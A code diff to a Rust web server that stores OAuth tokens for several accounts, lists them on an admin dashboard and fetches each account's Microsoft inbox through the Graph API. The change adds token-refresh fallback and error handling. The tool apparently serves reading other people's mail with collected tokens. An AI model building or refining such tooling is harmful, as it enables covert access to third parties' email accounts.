@@ -161,19 +161,37 @@ async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>)
         .await
         .unwrap_or(None);
     if let Some(token) = row {
+        // Try to refresh the access token
         let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
-        let access = fresh_access.unwrap_or(token.access_token);
+        let access = match fresh_access {
+            Some(t) => t,
+            None => {
+                // Fall back to stored access token, but it may be expired
+                println!("Failed to refresh token for {}", token.id);
+                token.access_token.clone()
+            }
+        };
+        
         let client = reqwest::Client::new();
-        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=50&$orderby=receivedDateTime DESC")
+        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
             .header("Authorization", format!("Bearer {}", access))
             .send()
             .await;
+        
         match resp {
             Ok(r) => {
+                if r.status() == 401 {
+                    // Unauthorized – token invalid
+                    return HttpResponse::Unauthorized().json(serde_json::json!({
+                        "error": "Access token expired and refresh failed. The refresh token may be revoked or expired."
+                    }));
+                }
                 let body: serde_json::Value = r.json().await.unwrap_or_default();
                 HttpResponse::Ok().json(body)
             }
-            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e.to_string()}))
+            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({
+                "error": format!("Request failed: {}", e)
+            }))
         }
     } else {
         HttpResponse::NotFound().json(serde_json::json!({"error": "Token not found"}))
@@ -216,7 +234,7 @@ async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
         let refresh_short = if token.refresh_token.len() > 20 { format!("{}...", &token.refresh_token[..20]) } else { token.refresh_token.clone() };
         html.push_str(&format!(
             r#"<tr><td>{}</td><td>{}</td><td class='token'>{}</td><td>{}</td><td>{}</td>
-            <td><a href='/inbox_view?token_id={}'><button>📧 View Inbox</button></a></td></tr>"#,
+            <td><a href='/inbox_view?token_id={}'><button>View Inbox</button></a></td></tr>"#,
             token.id, email, refresh_short, token.expires_at, token.source, token.id
         ));
     }
